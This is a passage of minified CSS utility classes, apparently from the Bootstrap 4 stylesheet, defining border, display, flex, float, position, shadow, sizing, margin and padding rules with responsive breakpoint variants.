#dee2e6!important}.border-0{border:0!important}.border-top-0{border-top:0!important}.border-right-0{border-right:0!important}.border-bottom-0{border-bottom:0!important}.border-left-0{border-left:0!important}.border-primary{border-color:#007bff!important}.border-secondary{border-color:#6c757d!important}.border-success{border-color:#28a745!important}.border-info{border-color:#17a2b8!important}.border-warning{border-color:#ffc107!important}.border-danger{border-color:#dc3545!important}.border-light{border-color:#f8f9fa!important}.border-dark{border-color:#343a40!important}.border-white{border-color:#fff!important}.rounded-sm{border-radius:.2rem!important}.rounded{border-radius:.25rem!important}.rounded-top{border-top-left-radius:.25rem!important;border-top-right-radius:.25rem!important}.rounded-right{border-top-right-radius:.25rem!important;border-bottom-right-radius:.25rem!important}.rounded-bottom{border-bottom-right-radius:.25rem!important;border-bottom-left-radius:.25rem!important}.rounded-left{border-top-left-radius:.25rem!important;border-bottom-left-radius:.25rem!important}.rounded-lg{border-radius:.3rem!important}.rounded-circle{border-radius:50%!important}.rounded-pill{border-radius:50rem!important}.rounded-0{border-radius:0!important}.clearfix::after{display:block;clear:both;content:""}.d-none{display:none!important}.d-inline{display:inline!important}.d-inline-block{display:inline-block!important}.d-block{display:block!important}.d-table{display:table!important}.d-table-row{display:table-row!important}.d-table-cell{display:table-cell!important}.d-flex{display:-ms-flexbox!important;display:flex!important}.d-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}@media (min-width:576px){.d-sm-none{display:none!important}.d-sm-inline{display:inline!important}.d-sm-inline-block{display:inline-block!important}.d-sm-block{display:block!important}.d-sm-table{display:table!important}.d-sm-table-row{display:table-row!important}.d-sm-table-cell{display:table-cell!important}.d-sm-flex{display:-ms-flexbox!important;display:flex!important}.d-sm-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}@media (min-width:768px){.d-md-none{display:none!important}.d-md-inline{display:inline!important}.d-md-inline-block{display:inline-block!important}.d-md-block{display:block!important}.d-md-table{display:table!important}.d-md-table-row{display:table-row!important}.d-md-table-cell{display:table-cell!important}.d-md-flex{display:-ms-flexbox!important;display:flex!important}.d-md-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}@media (min-width:992px){.d-lg-none{display:none!important}.d-lg-inline{display:inline!important}.d-lg-inline-block{display:inline-block!important}.d-lg-block{display:block!important}.d-lg-table{display:table!important}.d-lg-table-row{display:table-row!important}.d-lg-table-cell{display:table-cell!important}.d-lg-flex{display:-ms-flexbox!important;display:flex!important}.d-lg-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}@media (min-width:1200px){.d-xl-none{display:none!important}.d-xl-inline{display:inline!important}.d-xl-inline-block{display:inline-block!important}.d-xl-block{display:block!important}.d-xl-table{display:table!important}.d-xl-table-row{display:table-row!important}.d-xl-table-cell{display:table-cell!important}.d-xl-flex{display:-ms-flexbox!important;display:flex!important}.d-xl-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}@media print{.d-print-none{display:none!important}.d-print-inline{display:inline!important}.d-print-inline-block{display:inline-block!important}.d-print-block{display:block!important}.d-print-table{display:table!important}.d-print-table-row{display:table-row!important}.d-print-table-cell{display:table-cell!important}.d-print-flex{display:-ms-flexbox!important;display:flex!important}.d-print-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}.embed-responsive{position:relative;display:block;width:100%;padding:0;overflow:hidden}.embed-responsive::before{display:block;content:""}.embed-responsive .embed-responsive-item,.embed-responsive embed,.embed-responsive iframe,.embed-responsive object,.embed-responsive video{position:absolute;top:0;bottom:0;left:0;width:100%;height:100%;border:0}.embed-responsive-21by9::before{padding-top:42.857143%}.embed-responsive-16by9::before{padding-top:56.25%}.embed-responsive-4by3::before{padding-top:75%}.embed-responsive-1by1::before{padding-top:100%}.flex-row{-ms-flex-direction:row!important;flex-direction:row!important}.flex-column{-ms-flex-direction:column!important;flex-direction:column!important}.flex-row-reverse{-ms-flex-direction:row-reverse!important;flex-direction:row-reverse!important}.flex-column-reverse{-ms-flex-direction:column-reverse!important;flex-direction:column-reverse!important}.flex-wrap{-ms-flex-wrap:wrap!important;flex-wrap:wrap!important}.flex-nowrap{-ms-flex-wrap:nowrap!important;flex-wrap:nowrap!important}.flex-wrap-reverse{-ms-flex-wrap:wrap-reverse!important;flex-wrap:wrap-reverse!important}.flex-fill{-ms-flex:1 1 auto!important;flex:1 1 auto!important}.flex-grow-0{-ms-flex-positive:0!important;flex-grow:0!important}.flex-grow-1{-ms-flex-positive:1!important;flex-grow:1!important}.flex-shrink-0{-ms-flex-negative:0!important;flex-shrink:0!important}.flex-shrink-1{-ms-flex-negative:1!important;flex-shrink:1!important}.justify-content-start{-ms-flex-pack:start!important;justify-content:flex-start!important}.justify-content-end{-ms-flex-pack:end!important;justify-content:flex-end!important}.justify-content-center{-ms-flex-pack:center!important;justify-content:center!important}.justify-content-between{-ms-flex-pack:justify!important;justify-content:space-between!important}.justify-content-around{-ms-flex-pack:distribute!important;justify-content:space-around!important}.align-items-start{-ms-flex-align:start!important;align-items:flex-start!important}.align-items-end{-ms-flex-align:end!important;align-items:flex-end!important}.align-items-center{-ms-flex-align:center!important;align-items:center!important}.align-items-baseline{-ms-flex-align:baseline!important;align-items:baseline!important}.align-items-stretch{-ms-flex-align:stretch!important;align-items:stretch!important}.align-content-start{-ms-flex-line-pack:start!important;align-content:flex-start!important}.align-content-end{-ms-flex-line-pack:end!important;align-content:flex-end!important}.align-content-center{-ms-flex-line-pack:center!important;align-content:center!important}.align-content-between{-ms-flex-line-pack:justify!important;align-content:space-between!important}.align-content-around{-ms-flex-line-pack:distribute!important;align-content:space-around!important}.align-content-stretch{-ms-flex-line-pack:stretch!important;align-content:stretch!important}.align-self-auto{-ms-flex-item-align:auto!important;align-self:auto!important}.align-self-start{-ms-flex-item-align:start!important;align-self:flex-start!important}.align-self-end{-ms-flex-item-align:end!important;align-self:flex-end!important}.align-self-center{-ms-flex-item-align:center!important;align-self:center!important}.align-self-baseline{-ms-flex-item-align:baseline!important;align-self:baseline!important}.align-self-stretch{-ms-flex-item-align:stretch!important;align-self:stretch!important}@media (min-width:576px){.flex-sm-row{-ms-flex-direction:row!important;flex-direction:row!important}.flex-sm-column{-ms-flex-direction:column!important;flex-direction:column!important}.flex-sm-row-reverse{-ms-flex-direction:row-reverse!important;flex-direction:row-reverse!important}.flex-sm-column-reverse{-ms-flex-direction:column-reverse!important;flex-direction:column-reverse!important}.flex-sm-wrap{-ms-flex-wrap:wrap!important;flex-wrap:wrap!important}.flex-sm-nowrap{-ms-flex-wrap:nowrap!important;flex-wrap:nowrap!important}.flex-sm-wrap-reverse{-ms-flex-wrap:wrap-reverse!important;flex-wrap:wrap-reverse!important}.flex-sm-fill{-ms-flex:1 1 auto!important;flex:1 1 auto!important}.flex-sm-grow-0{-ms-flex-positive:0!important;flex-grow:0!important}.flex-sm-grow-1{-ms-flex-positive:1!important;flex-grow:1!important}.flex-sm-shrink-0{-ms-flex-negative:0!important;flex-shrink:0!important}.flex-sm-shrink-1{-ms-flex-negative:1!important;flex-shrink:1!important}.justify-content-sm-start{-ms-flex-pack:start!important;justify-content:flex-start!important}.justify-content-sm-end{-ms-flex-pack:end!important;justify-content:flex-end!important}.justify-content-sm-center{-ms-flex-pack:center!important;justify-content:center!important}.justify-content-sm-between{-ms-flex-pack:justify!important;justify-content:space-between!important}.justify-content-sm-around{-ms-flex-pack:distribute!important;justify-content:space-around!important}.align-items-sm-start{-ms-flex-align:start!important;align-items:flex-start!important}.align-items-sm-end{-ms-flex-align:end!important;align-items:flex-end!important}.align-items-sm-center{-ms-flex-align:center!important;align-items:center!important}.align-items-sm-baseline{-ms-flex-align:baseline!important;align-items:baseline!important}.align-items-sm-stretch{-ms-flex-align:stretch!important;align-items:stretch!important}.align-content-sm-start{-ms-flex-line-pack:start!important;align-content:flex-start!important}.align-content-sm-end{-ms-flex-line-pack:end!important;align-content:flex-end!important}.align-content-sm-center{-ms-flex-line-pack:center!important;align-content:center!important}.align-content-sm-between{-ms-flex-line-pack:justify!important;align-content:space-between!important}.align-content-sm-around{-ms-flex-line-pack:distribute!important;align-content:space-around!important}.align-content-sm-stretch{-ms-flex-line-pack:stretch!important;align-content:stretch!important}.align-self-sm-auto{-ms-flex-item-align:auto!important;align-self:auto!important}.align-self-sm-start{-ms-flex-item-align:start!important;align-self:flex-start!important}.align-self-sm-end{-ms-flex-item-align:end!important;align-self:flex-end!important}.align-self-sm-center{-ms-flex-item-align:center!important;align-self:center!important}.align-self-sm-baseline{-ms-flex-item-align:baseline!important;align-self:baseline!important}.align-self-sm-stretch{-ms-flex-item-align:stretch!important;align-self:stretch!important}}@media (min-width:768px){.flex-md-row{-ms-flex-direction:row!important;flex-direction:row!important}.flex-md-column{-ms-flex-direction:column!important;flex-direction:column!important}.flex-md-row-reverse{-ms-flex-direction:row-reverse!important;flex-direction:row-reverse!important}.flex-md-column-reverse{-ms-flex-direction:column-reverse!important;flex-direction:column-reverse!important}.flex-md-wrap{-ms-flex-wrap:wrap!important;flex-wrap:wrap!important}.flex-md-nowrap{-ms-flex-wrap:nowrap!important;flex-wrap:nowrap!important}.flex-md-wrap-reverse{-ms-flex-wrap:wrap-reverse!important;flex-wrap:wrap-reverse!important}.flex-md-fill{-ms-flex:1 1 auto!important;flex:1 1 auto!important}.flex-md-grow-0{-ms-flex-positive:0!important;flex-grow:0!important}.flex-md-grow-1{-ms-flex-positive:1!important;flex-grow:1!important}.flex-md-shrink-0{-ms-flex-negative:0!important;flex-shrink:0!important}.flex-md-shrink-1{-ms-flex-negative:1!important;flex-shrink:1!important}.justify-content-md-start{-ms-flex-pack:start!important;justify-content:flex-start!important}.justify-content-md-end{-ms-flex-pack:end!important;justify-content:flex-end!important}.justify-content-md-center{-ms-flex-pack:center!important;justify-content:center!important}.justify-content-md-between{-ms-flex-pack:justify!important;justify-content:space-between!important}.justify-content-md-around{-ms-flex-pack:distribute!important;justify-content:space-around!important}.align-items-md-start{-ms-flex-align:start!important;align-items:flex-start!important}.align-items-md-end{-ms-flex-align:end!important;align-items:flex-end!important}.align-items-md-center{-ms-flex-align:center!important;align-items:center!important}.align-items-md-baseline{-ms-flex-align:baseline!important;align-items:baseline!important}.align-items-md-stretch{-ms-flex-align:stretch!important;align-items:stretch!important}.align-content-md-start{-ms-flex-line-pack:start!important;align-content:flex-start!important}.align-content-md-end{-ms-flex-line-pack:end!important;align-content:flex-end!important}.align-content-md-center{-ms-flex-line-pack:center!important;align-content:center!important}.align-content-md-between{-ms-flex-line-pack:justify!important;align-content:space-between!important}.align-content-md-around{-ms-flex-line-pack:distribute!important;align-content:space-around!important}.align-content-md-stretch{-ms-flex-line-pack:stretch!important;align-content:stretch!important}.align-self-md-auto{-ms-flex-item-align:auto!important;align-self:auto!important}.align-self-md-start{-ms-flex-item-align:start!important;align-self:flex-start!important}.align-self-md-end{-ms-flex-item-align:end!important;align-self:flex-end!important}.align-self-md-center{-ms-flex-item-align:center!important;align-self:center!important}.align-self-md-baseline{-ms-flex-item-align:baseline!important;align-self:baseline!important}.align-self-md-stretch{-ms-flex-item-align:stretch!important;align-self:stretch!important}}@media (min-width:992px){.flex-lg-row{-ms-flex-direction:row!important;flex-direction:row!important}.flex-lg-column{-ms-flex-direction:column!important;flex-direction:column!important}.flex-lg-row-reverse{-ms-flex-direction:row-reverse!important;flex-direction:row-reverse!important}.flex-lg-column-reverse{-ms-flex-direction:column-reverse!important;flex-direction:column-reverse!important}.flex-lg-wrap{-ms-flex-wrap:wrap!important;flex-wrap:wrap!important}.flex-lg-nowrap{-ms-flex-wrap:nowrap!important;flex-wrap:nowrap!important}.flex-lg-wrap-reverse{-ms-flex-wrap:wrap-reverse!important;flex-wrap:wrap-reverse!important}.flex-lg-fill{-ms-flex:1 1 auto!important;flex:1 1 auto!important}.flex-lg-grow-0{-ms-flex-positive:0!important;flex-grow:0!important}.flex-lg-grow-1{-ms-flex-positive:1!important;flex-grow:1!important}.flex-lg-shrink-0{-ms-flex-negative:0!important;flex-shrink:0!important}.flex-lg-shrink-1{-ms-flex-negative:1!important;flex-shrink:1!important}.justify-content-lg-start{-ms-flex-pack:start!important;justify-content:flex-start!important}.justify-content-lg-end{-ms-flex-pack:end!important;justify-content:flex-end!important}.justify-content-lg-center{-ms-flex-pack:center!important;justify-content:center!important}.justify-content-lg-between{-ms-flex-pack:justify!important;justify-content:space-between!important}.justify-content-lg-around{-ms-flex-pack:distribute!important;justify-content:space-around!important}.align-items-lg-start{-ms-flex-align:start!important;align-items:flex-start!important}.align-items-lg-end{-ms-flex-align:end!important;align-items:flex-end!important}.align-items-lg-center{-ms-flex-align:center!important;align-items:center!important}.align-items-lg-baseline{-ms-flex-align:baseline!important;align-items:baseline!important}.align-items-lg-stretch{-ms-flex-align:stretch!important;align-items:stretch!important}.align-content-lg-start{-ms-flex-line-pack:start!important;align-content:flex-start!important}.align-content-lg-end{-ms-flex-line-pack:end!important;align-content:flex-end!important}.align-content-lg-center{-ms-flex-line-pack:center!important;align-content:center!important}.align-content-lg-between{-ms-flex-line-pack:justify!important;align-content:space-between!important}.align-content-lg-around{-ms-flex-line-pack:distribute!important;align-content:space-around!important}.align-content-lg-stretch{-ms-flex-line-pack:stretch!important;align-content:stretch!important}.align-self-lg-auto{-ms-flex-item-align:auto!important;align-self:auto!important}.align-self-lg-start{-ms-flex-item-align:start!important;align-self:flex-start!important}.align-self-lg-end{-ms-flex-item-align:end!important;align-self:flex-end!important}.align-self-lg-center{-ms-flex-item-align:center!important;align-self:center!important}.align-self-lg-baseline{-ms-flex-item-align:baseline!important;align-self:baseline!important}.align-self-lg-stretch{-ms-flex-item-align:stretch!important;align-self:stretch!important}}@media (min-width:1200px){.flex-xl-row{-ms-flex-direction:row!important;flex-direction:row!important}.flex-xl-column{-ms-flex-direction:column!important;flex-direction:column!important}.flex-xl-row-reverse{-ms-flex-direction:row-reverse!important;flex-direction:row-reverse!important}.flex-xl-column-reverse{-ms-flex-direction:column-reverse!important;flex-direction:column-reverse!important}.flex-xl-wrap{-ms-flex-wrap:wrap!important;flex-wrap:wrap!important}.flex-xl-nowrap{-ms-flex-wrap:nowrap!important;flex-wrap:nowrap!important}.flex-xl-wrap-reverse{-ms-flex-wrap:wrap-reverse!important;flex-wrap:wrap-reverse!important}.flex-xl-fill{-ms-flex:1 1 auto!important;flex:1 1 auto!important}.flex-xl-grow-0{-ms-flex-positive:0!important;flex-grow:0!important}.flex-xl-grow-1{-ms-flex-positive:1!important;flex-grow:1!important}.flex-xl-shrink-0{-ms-flex-negative:0!important;flex-shrink:0!important}.flex-xl-shrink-1{-ms-flex-negative:1!important;flex-shrink:1!important}.justify-content-xl-start{-ms-flex-pack:start!important;justify-content:flex-start!important}.justify-content-xl-end{-ms-flex-pack:end!important;justify-content:flex-end!important}.justify-content-xl-center{-ms-flex-pack:center!important;justify-content:center!important}.justify-content-xl-between{-ms-flex-pack:justify!important;justify-content:space-between!important}.justify-content-xl-around{-ms-flex-pack:distribute!important;justify-content:space-around!important}.align-items-xl-start{-ms-flex-align:start!important;align-items:flex-start!important}.align-items-xl-end{-ms-flex-align:end!important;align-items:flex-end!important}.align-items-xl-center{-ms-flex-align:center!important;align-items:center!important}.align-items-xl-baseline{-ms-flex-align:baseline!important;align-items:baseline!important}.align-items-xl-stretch{-ms-flex-align:stretch!important;align-items:stretch!important}.align-content-xl-start{-ms-flex-line-pack:start!important;align-content:flex-start!important}.align-content-xl-end{-ms-flex-line-pack:end!important;align-content:flex-end!important}.align-content-xl-center{-ms-flex-line-pack:center!important;align-content:center!important}.align-content-xl-between{-ms-flex-line-pack:justify!important;align-content:space-between!important}.align-content-xl-around{-ms-flex-line-pack:distribute!important;align-content:space-around!important}.align-content-xl-stretch{-ms-flex-line-pack:stretch!important;align-content:stretch!important}.align-self-xl-auto{-ms-flex-item-align:auto!important;align-self:auto!important}.align-self-xl-start{-ms-flex-item-align:start!important;align-self:flex-start!important}.align-self-xl-end{-ms-flex-item-align:end!important;align-self:flex-end!important}.align-self-xl-center{-ms-flex-item-align:center!important;align-self:center!important}.align-self-xl-baseline{-ms-flex-item-align:baseline!important;align-self:baseline!important}.align-self-xl-stretch{-ms-flex-item-align:stretch!important;align-self:stretch!important}}.float-left{float:left!important}.float-right{float:right!important}.float-none{float:none!important}@media (min-width:576px){.float-sm-left{float:left!important}.float-sm-right{float:right!important}.float-sm-none{float:none!important}}@media (min-width:768px){.float-md-left{float:left!important}.float-md-right{float:right!important}.float-md-none{float:none!important}}@media (min-width:992px){.float-lg-left{float:left!important}.float-lg-right{float:right!important}.float-lg-none{float:none!important}}@media (min-width:1200px){.float-xl-left{float:left!important}.float-xl-right{float:right!important}.float-xl-none{float:none!important}}.user-select-all{-webkit-user-select:all!important;-moz-user-select:all!important;-ms-user-select:all!important;user-select:all!important}.user-select-auto{-webkit-user-select:auto!important;-moz-user-select:auto!important;-ms-user-select:auto!important;user-select:auto!important}.user-select-none{-webkit-user-select:none!important;-moz-user-select:none!important;-ms-user-select:none!important;user-select:none!important}.overflow-auto{overflow:auto!important}.overflow-hidden{overflow:hidden!important}.position-static{position:static!important}.position-relative{position:relative!important}.position-absolute{position:absolute!important}.position-fixed{position:fixed!important}.position-sticky{position:-webkit-sticky!important;position:sticky!important}.fixed-top{position:fixed;top:0;right:0;left:0;z-index:1030}.fixed-bottom{position:fixed;right:0;bottom:0;left:0;z-index:1030}@supports ((position:-webkit-sticky) or (position:sticky)){.sticky-top{position:-webkit-sticky;position:sticky;top:0;z-index:1020}}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;overflow:visible;clip:auto;white-space:normal}.shadow-sm{box-shadow:0 .125rem .25rem rgba(0,0,0,.075)!important}.shadow{box-shadow:0 .5rem 1rem rgba(0,0,0,.15)!important}.shadow-lg{box-shadow:0 1rem 3rem rgba(0,0,0,.175)!important}.shadow-none{box-shadow:none!important}.w-25{width:25%!important}.w-50{width:50%!important}.w-75{width:75%!important}.w-100{width:100%!important}.w-auto{width:auto!important}.h-25{height:25%!important}.h-50{height:50%!important}.h-75{height:75%!important}.h-100{height:100%!important}.h-auto{height:auto!important}.mw-100{max-width:100%!important}.mh-100{max-height:100%!important}.min-vw-100{min-width:100vw!important}.min-vh-100{min-height:100vh!important}.vw-100{width:100vw!important}.vh-100{height:100vh!important}.m-0{margin:0!important}.mt-0,.my-0{margin-top:0!important}.mr-0,.mx-0{margin-right:0!important}.mb-0,.my-0{margin-bottom:0!important}.ml-0,.mx-0{margin-left:0!important}.m-1{margin:.25rem!important}.mt-1,.my-1{margin-top:.25rem!important}.mr-1,.mx-1{margin-right:.25rem!important}.mb-1,.my-1{margin-bottom:.25rem!important}.ml-1,.mx-1{margin-left:.25rem!important}.m-2{margin:.5rem!important}.mt-2,.my-2{margin-top:.5rem!important}.mr-2,.mx-2{margin-right:.5rem!important}.mb-2,.my-2{margin-bottom:.5rem!important}.ml-2,.mx-2{margin-left:.5rem!important}.m-3{margin:1rem!important}.mt-3,.my-3{margin-top:1rem!important}.mr-3,.mx-3{margin-right:1rem!important}.mb-3,.my-3{margin-bottom:1rem!important}.ml-3,.mx-3{margin-left:1rem!important}.m-4{margin:1.5rem!important}.mt-4,.my-4{margin-top:1.5rem!important}.mr-4,.mx-4{margin-right:1.5rem!important}.mb-4,.my-4{margin-bottom:1.5rem!important}.ml-4,.mx-4{margin-left:1.5rem!important}.m-5{margin:3rem!important}.mt-5,.my-5{margin-top:3rem!important}.mr-5,.mx-5{margin-right:3rem!important}.mb-5,.my-5{margin-bottom:3rem!important}.ml-5,.mx-5{margin-left:3rem!important}.p-0{padding:0!important}.pt-0,.py-0{padding-top:0!important}.pr-0,.px-0{padding-right:0!important}.pb-0,.py-0{padding-bottom:0!important}.pl-0,.px-0{padding-left:0!important}.p-1{padding:.25rem!important}.pt-1,.py-1{padding-top:.25rem!important}.pr-1,.px-1{padding-right:.25rem!important}.pb-1,.py-1{padding-bottom:.25rem!important}.pl-1,.px-1{padding-left:.25rem!important}.p-2{padding:.5rem!important}.pt-2,.py-2{padding-top:.5rem!important}.pr-2,.px-2{padding-right:.5rem!important}.pb-2,.py-2{padding-bottom:.5rem!important}.pl-2,.px-2{padding-left:.5rem!important}.p-3{padding:1rem!important}.pt-3,.py-3{padding-top:1rem!important}.pr-3,.px-3{padding-right:1rem!important}.pb-3,.py-3{padding-bottom:1rem!important}.pl-3,.px-3{padding-left:1rem!important}.p-4{padding:1.5rem!important}.pt-4,.py-4{padding-top:1.5rem!important}.pr-4,.px-4{padding-right:1.5rem!important}.pb-4,.py-4{padding-bottom:1.5rem!important}.pl-4,.px-4{padding-left:1.5rem!important}.p-5{padding:3rem!important}.pt-5,.py-5{padding-top:3rem!important}.pr-5,.px-5{padding-right:3rem!important}.pb-5,.py-5{padding-bottom:3rem!important}.pl-5,.px-5{padding-left:3rem!important}.m-n1{margin:-.25rem!important}.mt-n1,.my-n1{margin-top:-.25rem!important}.mr-n1,.mx-n1{margin-right:-.25rem!important}.mb-n1,.my-n1{margin-bottom:-.25rem!important}.ml-n1,.mx-n1{margin-left:-.25rem!important}.m-n2{margin:-.5rem!important}.mt-n2,.my-n2{margin-top:-.5rem!important}.mr-n2,.mx-n2{margin-right:-.5rem!important}.mb-n2,.my-n2{margin-bottom:-.5rem!important}.ml-n2,.mx-n2{margin-left:-.5rem!important}.m-n3{margin:-1rem!important}.mt-n3,.my-n3{margin-top:-1rem!important}.mr-n3,.mx-n3{margin-right:-1rem!important}.mb-n3,.my-n3{margin-bottom:-1rem!important}.ml-n3,.mx-n3{margin-left:-1rem!important}.m-n4{margin:-1.5rem!important}.mt-n4,.my-n4{margin-top:-1.5rem!important}.mr-n4,.mx-n4{margin-right:-1.5rem!important}.mb-n4,.my-n4{margin-bottom:-1.5rem!important}.ml-n4,.mx-n4{margin-left:-1.5rem!important}.m-n5{margin:-3rem!important}.mt-n5,.my-n5{margin-top:-3rem!important}.mr-n5,.mx-n5{margin-right:-3rem!important}.mb-n5,.my-n5{margin-bottom:-3rem!important}.ml-n5,.mx-n5{margin-left:-3rem!important}.m-auto{margin:auto!important}.mt-auto,.my-auto{margin-top:auto!important}.mr-auto,.mx-auto{margin-right:auto!important}.mb-auto,.my-auto{margin-bottom:auto!important}.ml-auto,.mx-auto{margin-left:auto!important}@media (min-width:576px){.m-sm-0{margin:0!important}.mt-sm-0,.my-sm-0{margin-top:0!important}.mr-sm-0,.mx-sm-0{margin-right:0!important}.mb-sm-0,.my-sm-0{margin-bottom:0!important}.ml-sm-0,.mx-sm-0{margin-left:0!important}.m-sm-1{margin:.25rem!important}.mt-sm-1,.my-sm-1{margin-top:.25rem!important}.mr-sm-1,.mx-sm-1{margin-right:.25rem!important}.mb-sm-1,.my-sm-1{margin-bottom:.25rem!important}.ml-sm-1,.mx-sm-1{margin-left:.25rem!important}.m-sm-2{margin:.5rem!important}.mt-sm-2,.my-sm-2{margin-top:.5rem!important}.mr-sm-2,.mx-sm-2{margin-right:.5rem!important}.mb-sm-2,.my-sm-2{margin-bottom:.5rem!important}.ml-sm-2,.mx-sm-2{margin-left:.5rem!important}.m-sm-3{margin:1rem!important}.mt-sm-3,.my-sm-3{margin-top:1rem!important}.mr-sm-3,.mx-sm-3{margin-right:1rem!important}.mb-sm-3,.my-sm-3{margin-bottom:1rem!important}.ml-sm-3,.mx-sm-3{margin-left:1rem!important}.m-sm-4{margin:1.5rem!important}.mt-sm-4,.my-sm-4{margin-top:1.5rem!important}.mr-sm-4,.mx-sm-4{margin-right:1.5rem!important}.mb-sm-4,.my-sm-4{margin-bottom:1.5rem!important}.ml-sm-4,.mx-sm-4{margin-left:1.5rem!important}.m-sm-5{margin:3rem!important}.mt-sm-5,.my-sm-5{margin-top:3rem!important}.mr-sm-5,.mx-sm-5{margin-right:3rem!important}.mb-sm-5,.my-sm-5{margin-bottom:3rem!important}.ml-sm-5,.mx-sm-5{margin-left:3rem!important}.p-sm-0{padding:0!important}.pt-sm-0,.py-sm-0{padding-top:0!important}.pr-sm-0,.px-sm-0{padding-right:0!important}.pb-sm-0,.py-sm-0{padding-bottom:0!important}.pl-sm-0,.px-sm-0{padding-left:0!important}.p-sm-1{padding:.25rem!important}.pt-sm-1,.py-sm-1{padding-top:.25rem!important}.pr-sm-1,.px-sm-1{padding-right:.25rem!important}.pb-sm-1,.py-sm-1{padding-bottom:.25rem!important}.pl-sm-1,.px-sm-1{padding-left:.25rem!important}.p-sm-2{padding:.5rem!important}.pt-sm-2,.py-sm-2{padding-top:.5rem!important}.pr-sm-2,.px-sm-2{padding-right:.5rem!important}.pb-sm-2,.py-sm-2{padding-bottom:.5rem!important}.pl-sm-2,.px-sm-2{padding-left:.5rem!important}.p-sm-3{padding:1rem!important}.pt-sm-3,.py-sm-3{padding-top:1rem!important}.pr-sm-3,.px-sm-3{padding-right:1rem!important}.pb-sm-3,.py-sm-3{padding-bottom:1rem!important}.pl-sm-3,.px-sm-3{padding-left:1rem!important}.p-sm-4{padding:1.5rem!important}.pt-sm-4,.py-sm-4{padding-top:1.5rem!important}.pr-sm-4,.px-sm-4{padding-right:1.5rem!important}.pb-sm-4,.py-sm-4{padding-bottom:1.5rem!important}.pl-sm-4,.px-sm-4{padding-left:1.5rem!important}.p-sm-5{padding:3rem!important}.pt-sm-5,.py-sm-5{padding-top:3rem!important}.pr-sm-5,.px-sm-5{padding-right:3rem!important}.pb-sm-5,.py-sm-5{padding-bottom:3rem!important}.pl-sm-5,.px-sm-5{padding-left:3rem!important}.m-sm-n1{margin:-.25rem!important}.mt-sm-n1,.my-sm-n1{margin-top:-.25rem!important}.mr-sm-n1,.mx-sm-n1{margin-right:-.25rem!important}.mb-sm-n1,.my-sm-n1{margin-bottom:-.25rem!important}.ml-sm-n1,.mx-sm-n1{margin-left:-.25rem!important}.m-sm-n2{margin:-.5rem!important}.mt-sm-n2,.my-sm-n2{margin-top:-.5rem!important}.mr-sm-n2,.mx-sm-n2{margin-right:-.5rem!important}.mb-sm-n2,.my-sm-n2{margin-bottom:-.5rem!important}.ml-sm-n2,.mx-sm-n2{margin-left:-.5rem!important}.m-sm-n3{margin:-1rem!important}.mt-sm-n3,.my-sm-n3{margin-top:-1rem!important}.mr-sm-n3,.mx-sm-n3{margin-right:-1rem!important}.mb-sm-n3,.my-sm-n3{margin-bottom:-1rem!important}.ml-sm-n3,.mx-sm-n3{margin-left:-1rem!important}.m-sm-n4{margin:-1.5rem!important}.mt-sm-n4,.my-sm-n4{margin-top:-1.5rem!important}.mr-sm-n4,.mx-sm-n4{margin-right:-1.5rem!important}.mb-sm-n4,.my-sm-n4{margin-bottom:-1.5rem!important}.ml-sm-n4,.mx-sm-n4{margin-left:-1.5rem!important}.m-sm-n5{margin:-3rem!important}.mt-sm-n5,.my-sm-n5{margin-top:-3rem!important}.mr-sm-n5,.mx-sm-n5{margin-right:-3rem!important}.mb-sm-n5,.my-sm-n5{margin-bottom:-3rem!important}.ml-sm-n5,.mx-sm-n5{margin-left:-3rem!important}.m-sm-auto{margin:auto!important}.mt-sm-auto,.my-sm-auto{margin-top:auto!important}.mr-sm-auto,.mx-sm-auto{margin-right:auto!important}.mb-sm-auto,.my-sm-auto{margin-bottom:auto!important}.ml-sm-auto,.mx-sm-auto{margin-left:auto!important}}@media (min-width:768px){.m-md-0{margin:0!important}.mt-md-0,.my-md-0{margin-top:0!important}.mr-md-0,.mx-md-0{margin-right:0!important}.mb-md-0,.my-md-0{margin-bottom:0!important}.ml-md-0,.mx-md-0{margin-left:0!important}.m-md-1{margin:.25rem!important}.mt-md-1,.my-md-1{margin-top:.25rem!important}.mr-md-1,.mx-md-1{margin-right:.25rem!important}.mb-md-1,.my-md-1{margin-bottom:.25rem!important}.ml-md-1,.mx-md-1{margin-left:.25rem!important}.m-md-2{margin:.5rem!important}.mt-md-2,.my-md-2{margin-top:.5rem!important}.mr-md-2,.mx-md-2{margin-right:.5rem!important}.mb-md-2,.my-md-2{margin-bottom:.5rem!important}.ml-md-2,.mx-md-2{margin-left:.5rem!important}.m-md-3{margin:1rem!important}.mt-md-3,.my-md-3{margin-top:1rem!important}.mr-md-3,.mx-md-3{margin-right:1rem!important}.mb-md-3,.my-md-3{margin-bottom:1rem!important}.ml-md-3,.mx-md-3{margin-left:1rem!important}.m-md-4{margin:1.5rem!important}.mt-md-4,.my-md-4{margin-top:1.5rem!important}.mr-md-4,.mx-md-4{margin-right:1.5rem!important}.mb-md-4,.my-md-4{margin-bottom:1.5rem!important}.ml-md-4,.mx-md-4{margin-left:1.5rem!important}.m-md-5{margin:3rem!important}.mt-md-5,.my-md-5{margin-top:3rem!important}.mr-md-5,.mx-md-5{margin-right:3rem!important}.mb-md-5,.my-md-5{margin-bottom:3rem!important}.ml-md-5,.mx-md-5{margin-left:3rem!important}.p-md-0{padding:0!important}.pt-md-0,.py-md-0{padding-top:0!important}.pr-md-0,.px-md-0{padding-right:0!important}.pb-md-0,.py-md-0{padding-bottom:0!important}.pl-md-0,.px-md-0{padding-left:0!important}.p-md-1{padding:.25rem!important}.pt-md-1,.py-md-1{padding-top:.25rem!important}.pr-md-1,.px-md-1{padding-right:.25rem!important}.pb-md-1,.py-md-1{padding-bottom:.25rem!important}.pl-md-1,.px-md-1{padding-left:.25rem!important}.p-md-2{padding:.5rem!important}.pt-md-2,.py-md-2{padding-top:.5rem!important}.pr-md-2,.px-md-2{padding-right:.5rem!important}.pb-md-2,.py-md-2{padding-bottom:.5rem!important}.pl-md-2,.px-md-2{padding-left:.5rem!important}.p-md-3{padding:1rem!important}.pt-md-3,.py-md-3{padding-top:1rem!important}.pr-md-3